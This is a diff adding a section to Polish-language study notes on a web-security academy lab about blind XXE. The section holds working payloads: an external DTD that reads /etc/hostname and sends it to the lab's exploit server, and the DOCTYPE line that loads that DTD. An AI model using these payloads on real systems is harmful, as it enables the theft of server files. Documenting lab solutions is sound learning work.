@@ -84,6 +84,23 @@ Jak to działa (chyba)?
 notatka: nie możemy ostatecznego payloadu wpisać od razu, bo blokowane są entity, a w tym payloadzie, który wysyłamy entity tworzy się dopiero na serwerze
 
 
+## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+1. Na serwerze umieszczamy payload, który: 
+* definiuje entity zawierające zawartość pliku (% file)
+* definiuje entity, które dynamicznie tworzy inne entity (% eval)
+* definiuje entity tworzące zapytanie do strony atakującego z parametrem w postaci zawartości pliku (% exfiltrate)
+2. Adres do strony zostaje zapisany pod linkiem `/malicious.dtd`
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a2800520367222bc01434f601ea003b.web-security-academy.net/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+3. Na podatnej stronie wpisujemy payload, który tworzy zapytanie na stronę z payloadem:
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2800520367222bc01434f601ea003b.web-security-academy.net/malicious.dtd"> %xxe;]>
+```
+
 ## Lab: Exploiting XXE to retrieve data by repurposing a local DTD
 1. poprzez zapytania w typowe miejsca z pikami dtd (Document Type Definition) tj.:
 ```xml
